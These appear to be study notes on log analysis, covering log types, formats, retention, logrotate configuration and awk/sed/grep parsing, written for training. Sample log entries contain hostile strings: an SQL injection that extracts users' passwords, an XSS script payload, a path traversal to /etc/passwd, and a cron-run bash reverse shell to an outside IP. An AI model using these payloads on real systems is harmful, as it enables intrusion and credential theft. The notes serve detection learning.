*not logs from trees... SO bad.*

- Records of events within a system
	- User logins
	- File accesses
	- System errors
	- Network connections
	- Changes to data and or system configs
- Details:
	- Timestamp of the event
	- Name of the system or application that generated the log entry 
	- The type of event that occurred
	- Additional details (IP addresses, Usernames who initiated events etc)
- The W's
	- What happened?
	- When did it happen?
	- Where did it happen?
	- Who is responsible?
	- Were there actions successful?
	- What was the result of the action?

- Common Log Types
	- Application Logs
	- Audit Logs
		- Related to operational procedures crucial for regulatory compliance
	- Security Logs
		- Logins, perm changes, firewall activity, file access, etc
	- Server Logs
		- System, event, error and access logs, Server-side related events
	- System Logs
		- Kernel activities, system errors, boot sequences, hardware states, etc
	- Network Logs
		- Traffic, connections, Network-related events
	- Database Logs
		- Activities within a database system, queries, updates, etc
	- Web Server Logs
		- Requests processed by a Web Server, URLs, response codes etc

- Log Formats
	- Semi-structured
		- Syslog Message Format
		- Windows Event Log (EVTX) Format
	- Structured
		- Field Delimited Formats
			- CSVs and TSVs (tab separated values)
		- JavaScript Object Notation (JSON)
		- W3C Extended Log Foramt (ELF)
			- Web Server logging
			- IIS Servers use this
		- eXtensible Markup Language
	- Unstructured
		- NCSA Common Log Format (CLF)
			- Web Server log format for Client requests
			- Used by Apache
		- NCSA Combined Log Format (Combined)
			- Adding fields like Referrer and User Agent
			- Used by Nginx by default
- Log Standards
	- A set of guidelines or specs that define how logs should be created, transmitted and kept
	- Common Event Expression (CEE)
		- Developed by MITRE
		- Common structure for log data
		- Making it easier to create, transmit, store and analyse logs
	- OWASP Logging Cheat Sheet
		- A guide for devs on building application logging mechanisms, in mainly focusing on security logging
	- Syslog Protocol
		- Standard for message logging, allowing the separation of the software that generates messages from the system that stores them and the software that reports and analyses them
	- NIST Special Publication 800-82
		- Guides computer security log management
	- Azure Monitor Logs
		- Log monitoring on Azure guidelines
	- Google Cloud Logging
		- Guidelines for logging on the GCP - Google Cloud Platform
	- Oracle Cloud Infrastructure Logging
		- Guidelines for logging on the Oracle Cloud Infrastructure (OCI)
	- Virginia Tech - Standard for Information Technology Logging
		- Sample log review and compliance guideline

- Log Collection
	- Essential in log analysis
	- Involves the aggregation of logs from diverse sources such as Servers, Network Devices, Software, and Databases
	- NTP - Network Time Protocol is crucial in maintaining the system's time accuracy when generating logs
	- To ensure the integrity of the timeline of stored event(s), logs
	- Having a comprehensive data set to review, steps in being able to do so:
		- Identify sources
			- All potential log sources of an "event"
				- From all servers, databases, applications, devices involved
			- Choose a Log Collector
				- Choose a suitable log collector tool, or software that aligns with the infrastructure of the system
			- Configure Collection Parameters
				- Ensure that time-sync is enabled through NTP to maintain accurate timelines
				- Adjust settings to determine which events to log at what intervals and prioritise based on importance
			- Test Collection
				- Once configured, run a test to ensure logs are appropriately collected from all sources involved

- Log Management
	- Secure storage
	- Organised systematically 
	- Ready for swift/efficient access
	- Steps:
		- Storage
			- Retention period
			- Accessibility
		- Organisation
			- Classify logs based on their source, type or other criteria for easy access later
		- Backup
			- Regularly back up your logs to prevent data loss
		- Review
			- Periodically review logs to ensure they are stored and categorised correctly

- Log Centralisation
	- Important for 
		- Efficient log access
		- In-depth Analyssis
		- Rapid incident response
	- Real-time detection
	- Automatic notifications
	- Seamless integration
	- Incident management systems
	- Can consider the following:
		- Choose a Centralised System
			- Elastic Stack
			- Splunk
		- Integrate Sources
			- Connect all log sources into one centralised system
		- Set up Monitoring
			- Utilise tools that provide real-time monitoring and alerts for specific events
		- Integration with Incident Management
			- Ensure that the centralised system can integrate seamlessly with any incident management tools or protocols the infrastructure has in place

- Log Storage
	- Can be various locations
		- The local system from where the logs were generated
		- A centralised repository
		- Cloud-based
	- Choices usually depend on the following factors:
		- Security Requirements
			- Stored in compliance with organisational or regulatory security protocols
		- Accessibility Needs
			- How efficiently (quickly) and by which parties will the logs need to be accessed can influence the choice of storage
		- Storage Capacity
			- The volume of logs generated may require a fair amount of significant storage space, also influencing the decision making process
		- Cost Considerations
			- Budget(s) almost always dictate which platform/choice of storage is the way in moving forward
		- Compliance Regulations
			- Industry regulations governing log storage can affect this decision making process
		- Retention Policies
			- The amount of retention time and ease of retrieval can affect the decision making process
		- Disaster Recovery Plans (DR)
			- Ensuring the availability of logs in the event of a system failure may require specific storage solutions

- Log Retention
	- Consider that log storage will not need to be forever - a balance between retaining logs for potential future needs and the cost for storage.
	- Concepts:
		- Hot Storage
			- Logs from the last several months (3-6 usually) are most accessible.
			- Query speeds should be near real-time (depending on the complexity of the query)
		- Warm Storage
			- Logs from six months to two years
			- Acting as a 'data lake'
			- Easily accessible, bot not as immediate, efficient to retrieve as Hot Storage
		- Cold Storage
			- Archives, or compressed logs, from two to five years
			- Not easily accessible for the majority of the part
			- Used for retroactive analysis or scoping purposes

- Log Deletion
	- Backing up of log files (full on important)
	- Keeping a well defined Deletion Policy to ensure compliance with data protection laws and regulations. 
	- Log deletion helps to:
		- Maintain a manageable size of logs for analysis
		- Comply with privacy regulations, such as GDPR - which require unnecessary data to be deleted
		- Keep storage costs in balance

- Best Practices - Log Storage, Retention and Deletion
	- Determine the Storage, Retention and Deletion Policy based on both business requirements and legal requirements
	- Regularly review and update guidelines as conditions and regulations change
	- Automate the three processes to ensure consistency and to avoid human errors
	- Encrypt sensitive logs to protect data
	- Regular backups of the logs should be made - in particular, before deletion

Tools
- `rsyslog`
- `rotate 24` in a `.conf` file will usually dictate how many versions of log files will be kept
	- Provides support for message logging. Support of both Internet and Unix domain sockets enables the utility to support both local and remote logging
- `logrotate`
	- Log rotation is the process of controlling the size of log files
		- Compressed, moved, renamed or deleted once they are too old or too large in size
		- New log data is then directed into a new, fresh file
	- A tool that automates log file rotation, compression, and management
	- Ensuring log files are handled systematically. 
	- Allows the automatic rotation, compression and removal of log files. 
- An example:
	```
	/var/log/websrv-02/rsyslog_cron.log {
		hourly
		rotate 24
		compress
		lastaction
			DATE=$(date +"%Y-%m-%d")
			echo "$(date)" >> "/var/log/websrv-69/hashes_"$DATE"_rsyslog_cron.txt"
			for i in $(seq 1 24); do
				FILE="/var/log/websrv-02/rsyslog_cron.log.$i.gz"
				if [ -f "$FILE" ]; then
					HASH=$(/usr/bin/sha256sum "$FILE" | awk '{ print $1 }')
					echo "rsyslog_cron.log.$i.gz "$HASH"" >> "/var/log/websrv-69/hashes_"$DATE"_rsyslog_cron.txt"
				fi
			done
			systemctl restart rsyslog
		endscript
	}
	```

- Log Analysis Process
	- When properly and skillfully leveraged, logs can enhance:
		- System diagnostics
		- Cyber security
		- Regulatory compliance efforts
	- Involves:
		- Parsing
		- Normalisation
		- Sorting
		- Classification
		- Enrichment
		- Correlation
		- Visualisation
		- Reporting
	- Some tools:
		- Splunk
		- ELK
		- Ad-hoc methods! :D
		
	- Data Sources:
		- The systems or applications configured to log events or User activities
		- The origin from which these glorious logs came from
	- Parsing
		- The breaking down the log data into more manageable and human understandable components
		- Since there are a variety of formats depending on the sources from which the log(s) came, it's important to parse these logs to extract valuable information (from queries and the such)
	- Normalisation
		- Standardising parsed data
		- Bringing the various log data and putting into a standard format
		- Making comparing and analysing data from different sources (devices, apps, etc) easier
		- Crucial in environments with multiple systems and applications , where each might generate logs in another format
	- Sorting
		- Vital aspect of log analysis
		- It allows for efficient data retrieval and identification of patterns
		- Logs can be sorted by variables, such as:
			- Time
			- Source
			- Event Type
			- Severity
			- and any other parameter that could be present in the data
		- More than useful, can be seen as critical when identifying trends and anomalies that signal operational issues or security incidents
	- Classification
		- Involves assigning categories to the logs based on their characteristics
		- Teams can quickly filter and focus on those logs that matter most to the analysis taking place
		- Similar to sorting, however, this is more classifying/categorising events to help identify potential issues or threats that perhaps could be overlooked
	- Enrichment
		- Adds context to logs to make them more meaningful and easier to analyse
		- Could involve adding info like geographical data, use details, threat intelligence, or even data from other sources that can provide a complete picture of the event
		- Makes the log(s) more valuable
		- Enabling analysts to make better decisions and more accurately respond to incidents
		- Log enrichment can be automated using machine learning, reducing the time and effort required for log analysis
	- Correlation
		- Involves linking related records and identifying connections between log entries
		- This process helps detect patterns, trends and making the understanding of complex relationships between various log events easier
	- Visualisation
		- Represents log data in graphical formats, charts, graphs, heat maps and the such
		- Makes pattern recognition much easier for humans, alongside with trends and anomalies to be more efficiently identified
		- Also makes for an intuitive way to interpret large volumes of log data - making things more accessible and understandable
	- Reporting
		- Summarises log data into structured formats to provide insights, support decision making processes, or meet compliance requirements
		- Effective reporting includes creating clear, concise log data summaries
		- Catering to stakeholders' needs (management, other teams, or auditors)

- Log Analysis Techniques
	- Pattern Recognition
	- Anomaly Detection
	- Correlation Analysis
	- Timeline Analysis
	- Machine Learning and AI
	- Visualisation 
	- Statistical Analysis

- Log Configuration Options
	- Purposes
		- Security
			- Threat and anomaly detection
			- Logging User auth data
			- Ensuring integrity and data confidentiality
		- Operational
			- Proactively creating reports and notifications for system status
			- Troubleshooting
			- Capacity planning
			- Service billing
		- Compliance/Legal
			- Aligning with legal requirements
		- Debugging
			- Application/System debugging
			- Speeding up the dev process
	- **NOTE:**
		- **Operational and Security Requirements are non-negotiable.**

- Principles
	- Collection
		- Avoid log noise
		- Avoid irrelevant data
		- Collect what is needed and will be used
		- Define the purpose of the logging system.
	- Format
		- Incorporate a consistent log format
		- Ensure timestamps are accurate and synchronised across all entities that are being logged
	- Archiving and Accessibility
		- Create backups of stored data and used systems
		- Define Log Retention Policies and actually implement them
	- Monitoring and Alerting
		- Create alerts and notification queries that are important and will lead to noteworthy cases
		- Focus on actionable items/alerts/notifications and avoid the noise
	- Security
		- Implement Access Controls, always.
		- Encryption if needed
		- Use a dedicated Log Management System - efficiency is key too
	- Continuous Change
		- Be open to change
		- Train

- Challenges
	- Data Volume and Noise
		- Multiple data sources can lead to a lot of noise and volume of logs kept
		- Some applications may not even generate sufficient logs to analyse
		- Some applications could create too many!
		- Non-essential data
	- System Performance and Collection
		- System performance can be lessened when log collection is in place
		- Some systems are legacy and provide additional challenges to deal with
		- System updates can cause changes in logging processes
		- Synchronisation in large-scale networks can be a problem
	- Process and Archive
		- Multiple data formats to deal with 
		- Parsing data from different sources and formats can be time-consuming and lead to errors
		- Balancing log retention 
			- Also when considering compliance regulations and standards
	- Security
		- Ensuring data security is a challenge in itself
	- Analysis
		- Combining logs from multiple sources, analysing, correlating and combing them to understand the nature and depth of an incident and event is time-consuming
		- Also when considering that critical events have to be dealt with in real-time
		- Avoiding false positives
	- Miscellaneous
		- Lack of planning and a decent roadmap
		- Lack of finances, a decent and relevant budget
		- Lack of implementation scenarios, playbooks and exercises
		- Lack of skills to implement, maintain and analyse
		- Focusing on log collection instead of analysing (keeping things relevant)
		- Ignoring human factors and potential system errors
	- CHANGE
		- Configurations must always be analysed and modified with growing and changing/diverse threat actors 

- SUPER TIMELINES!
	- aka a consolidated timeline
	- Provide a overview of events across different systems, devices and applications
	- Allows analysts to understand the sequence of events holistically
	- Super useful and I think important, especially if the system being analysed is vast with multiple (heaps) of devices/entities that are logged
	- Tools (Timelines, Visualisation)
		- Allowing for a 'single-pane of glass' for when viewing logs, events and analysing events
		- Kibana (of the Elastic Stack)
		- Splunk
		- Open Source Tool for SUPER TIMELINES
			- Plaso (Python Log2Timeline)

- Common Log Locations
	- Web Servers:
		- Nginx
			- Access Logs:
				- `/var/log/nginx/access.log`
			- Error Logs:
				- `/var/log/nginx/error.log`
		- Apache
			- Access Logs:
				- `/var/log/apache2/access.log`
				- `/var/log/apache2/error.log`
	- Databases
		- MySQL
			- Error Logs:
				- `/var/log/mysql/error.log`
		- PostgreSQL
			- Error and Activity Logs:
				- `/var/log/postgresql/postgresql-{version}-main.log`
	- Web Applications:
		- PHP
			- `/var/log/php/error.log`
	- Operating Systems
		- Linux
			- `/var/log/syslog`
			- `/var/log/auth.log`
	- Firewalls, IDS/IPS
		- iptables
			- `/var/log/iptables.log`
		- Snort
			- `/var/log/snort/`

- Common Irregular User Activity Patterns
	- Against the baseline :) 
		- Tools
			- Splunk User Behaviour Analystics (UBA)
			- IBM QRadar (UBA)
			- Azure AD Identity Protection
	- Patterns:
		- Multiple failed login attempts
		- Unusual login times
		- Geographic anomalies
		- Frequent password changes
		- Unusual user-agent strings

- *Some* Common Attack Signatures (examples from logs)
	- SQL Injection
		- `10.10.61.21 - - [2023-08-02 15:27:42] "GET /products.php?q=books' UNION SELECT null, null, username, password, null FROM users-- HTTP/1.1" 200 3122`
			- Identified by the single-quote that is after books and before the UNION SELECT statement 
			- This can escape the original SQL legitimate query and allow further malicious SQL queries to be injected
	- Cross-Site Scripting (XSS)
		- `10.10.19.31 - - [2023-08-04 16:12:11] "GET /products.php?search=<script>alert(1);</script> HTTP/1.1" 200 5153`
			- Identified by the `<script>` tag and other event handlers like `onmousehover`, `onclick`, `onerror` 
	- Path Traversal
		- `10.10.113.45 - - [2023-08-05 18:17:25] "GET /../../../../../etc/passwd HTTP/1.1" 200 505`

- Automated Analysis (Tools)
	- XPLG
	- SolarWinds Loggly
	- These tools may often utilise Artificial Intelligence (AI) and Machine Learning to analyse patterns and trends
	- As the AI landscape evolves, we expect to see more effective automated analysis solutions
	- Benefits:
		- Saves time
		- Effective by utilising AI
	- Disadvantages:
		- Usually expensive
		- AI is only as effective as how capable the model it is based upon is
		- The risk of false positives increases
		- Or newer threats/events (never seen before) can be missed as the AI may not be 'trained' to recognise them
- Manual Analysis
	- Commands:
		- cat
		- less
		- tail
		- wc
		- cut
		- sort
		- 

	- Tools
		- SIEMs
			- Security Information and Event Management
				- Splunk
				- Elastic Search
				- Threat Fox
			- Open Source Tools
				- Log-Viewer
		- Linux-based systems can deploy the usual native tools like:
			- `cat`
			- `grep`
			- `sed`
			- `sort`
			- `uniq`
			- `awk`
			- `sha256sum`
		- Windows-based systems:
			- EZ-Tools
			- `Get-FileHash`

		- Open-source Example
			- Log Viewer
				`34.253.159.159 - - [09/Aug/2024:09:23:35 +0000] "GET /_dummy HTTP/1.0" 302 102 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" -`
		
		- Base-tool (Linux) Examples
			- (`cat` `grep` `sed` `sort` `uni` `awk` )
			- `jq` can be used to work with `json` files as well
		
			- `awk` and `sed` - processing Nginx Access Log
		
				Example log entry in `access.log`
			
				`34.253.159.159 - - [09/Aug/2024:07:48:32 +0000] "GET /api/v4/users/34 HTTP/1.0" 403 45 "http://gitlab.swiftspend.finance/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36" -`
				
				Example `awk` and `sed` normalisation command
					  
				`awk -F'[][]' '{print "[" $2 "]", "--- /var/log/gitlab/nginx/access.log ---", "\"" $0 "\""}' /var/log/gitlab/nginx/access.log | sed "s/ +0000//g" > /tmp/parsed_consolidated.log`
				
				Will produce a parsed and consolidated entry like:
				
				`[09/Aug/2024:07:48:41] --- /var/log/gitlab/nginx/access.log --- "34.253.159.159 - - [09/Aug/2024:07:48:41] "GET /_conf HTTP/1.0" 302 102 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" -"`
		
			- `awk` and `sed` - processing rsyslog_cron.log
				
				Example log entry in `rsyslog_cron.log`
				
				`Aug  9 09:50:01 WEBSRV-02 CRON[30266]: (root) CMD (/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1")`
				
				Example `awk` and `sed` normalisation command
				
				`awk '{ original_line = $0; gsub(/ /, "/", $1); printf "[%s%s/2023:%s] --- /var/log/websrv-02/rsyslog_cron.log --- \"%s\"\n", $2, $1, $3, original_line }' /var/log/websrv-02/rsyslog_cron.log >> /tmp/parsed_consolidated.log`
				
				Will produce a parsed and consolidated entry like:
				`
				`[9/Aug/2023:09:55:01] --- /var/log/websrv-02/rsyslog_cron.log --- "Aug  9 09:55:01 WEBSRV-02 CRON[31180]: (root) CMD (/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1")"`
		
			- `awk` and `sed` processing rsyslog_sshd.log
				
				Example log entry in `rsyslog_sshd.log`
				
				`Aug  9 09:59:13 WEBSRV-02 sshd[32001]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=34.253.159.159`
				
				Example `awk` and `sed` normalisation command
				
				`awk '{ original_line = $0; gsub(/ /, "/", $1); printf "[%s%s/2023:%s] --- /var/log/websrv-02/rsyslog_sshd.log --- \"%s\"\n", $2, $1, $3, original_line }' /var/log/websrv-02/rsyslog_sshd.log >> /tmp/parsed_consolidated.log`
						
				Will produce a parsed and consolidated entry like:
				
				`9Aug/2023:09:23:06] --- /var/log/websrv-02/rsyslog_sshd.log -- "Aug  9 09:23:06 WEBSRV-02 sshd[25079]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=34.253.159.159 "`
		
			- `awk` and `sed` processing api_json.log
			  
			  Example log entry in `api_json.log`
			  
			  `{"time":"2024-08-09T07:41:32.224Z","severity":"INFO","duration_s":0.00272,"db_duration_s":0.0,"view_duration_s":0.00272,"status":403,"method":"GET","path":"/api/v4/users/29","params":[],"host":"localhost","remote_ip":"34.253.159.159, 127.0.0.1, 34.253.159.159","ua":"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36","route":"/api/:version/users/:id","queue_duration_s":0.121997,"db_count":0,"db_write_count":0,"db_cached_count":0,"db_replica_count":0,"db_primary_count":0,"db_main_count":0,"db_main_replica_count":0,"db_replica_cached_count":0,"db_primary_cached_count":0,"db_main_cached_count":0,"db_main_replica_cached_count":0,"db_replica_wal_count":0,"db_primary_wal_count":0,"db_main_wal_count":0,"db_main_replica_wal_count":0,"db_replica_wal_cached_count":0,"db_primary_wal_cached_count":0,"db_main_wal_cached_count":0,"db_main_replica_wal_cached_count":0,"db_replica_duration_s":0.0,"db_primary_duration_s":0.0,"db_main_duration_s":0.0,"db_main_replica_duration_s":0.0,"cpu_s":0.05783,"mem_objects":3911,"mem_bytes":256536,"mem_mallocs":879,"mem_total_bytes":412976,"pid":3149,"worker_id":"puma_1","rate_limiting_gates":[],"correlation_id":"01J4V1BV096QEMGGPW61KP8W97","meta.client_id":"ip/34.253.159.159","meta.caller_id":"GET /api/:version/users/:id","meta.remote_ip":"34.253.159.159","meta.feature_category":"users","request_urgency":"low","target_duration_s":5}`
			  
			  Example `awk` and `sed` normalisation command
			  
			  `awk -F'"' '{timestamp = $4; converted = strftime("[%d/%b/%Y:%H:%M:%S]", mktime(substr(timestamp, 1, 4) " " substr(timestamp, 6, 2) " " substr(timestamp, 9, 2) " " substr(timestamp, 12, 2) " " substr(timestamp, 15, 2) " " substr(timestamp, 18, 2) " 0 0")); print converted, "--- /var/log/gitlab/gitlab-rails/api_json.log ---", "\""$0"\""}' /var/log/gitlab/gitlab-rails/api_json.log >> /tmp/parsed_consolidated.log`
			  
			  Will produce a parsed and consolidated entry like:
			  
			  `[09/Aug/2024:07:47:31] --- /var/log/gitlab/gitlab-rails/api_json.log --- "{"time":"2024-08-09T07:47:31.558Z","severity":"INFO","duration_s":0.02871,"db_duration_s":0.0,"view_duration_s":0.02871,"status":403,"method":"GET","path":"/api/v4/users/17","params":[],"host":"localhost","remote_ip":"34.253.159.159, 127.0.0.1, 34.253.159.159","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36","route":"/api/:version/users/:id","queue_duration_s":0.122769,"db_count":0,"db_write_count":0,"db_cached_count":0,"db_replica_count":0,"db_primary_count":0,"db_main_count":0,"db_main_replica_count":0,"db_replica_cached_count":0,"db_primary_cached_count":0,"db_main_cached_count":0,"db_main_replica_cached_count":0,"db_replica_wal_count":0,"db_primary_wal_count":0,"db_main_wal_count":0,"db_main_replica_wal_count":0,"db_replica_wal_cached_count":0,"db_primary_wal_cached_count":0,"db_main_wal_cached_count":0,"db_main_replica_wal_cached_count":0,"db_replica_duration_s":0.0,"db_primary_duration_s":0.0,"db_main_duration_s":0.0,"db_main_replica_duration_s":0.0,"cpu_s":0.053657,"mem_objects":3914,"mem_bytes":256552,"mem_mallocs":879,"mem_total_bytes":413112,"pid":5031,"worker_id":"puma_0","rate_limiting_gates":[],"correlation_id":"01J4V1PSYB7V3E1X0RBFHF98CB","meta.client_id":"ip/34.253.159.159","meta.caller_id":"GET /api/:version/users/:id","meta.remote_ip":"34.253.159.159","meta.feature_category":"users","request_urgency":"low","target_duration_s":5}"`
		
			- Using `grep` to then go through and filter specific entries, requirements (ie IP addresses, date/time, etc)
				`grep "34.253.159.159" /tmp/parsed_consolidated.log > /tmp/filtered_consolidated.log`
			
			- Using `sort` to log all entries by date and time:
				`sort /tmp/parsed_consolidated.log > /tmp/sort_parsed_consolidated.log`
			
			- Using `uniq` to remove duplicate entries:
				`uniq /tmp/sort_parsed_consolidated.log > /tmp/uniq_sort_parsed_consolidated.log`
			
			- These can then be accessed by `Log Viewer` in a Web-browser, for example:
				`http://10.10.36.19:8111/log?path=%2Ftmp%2Funiq_sort_parsed_consolidated.log`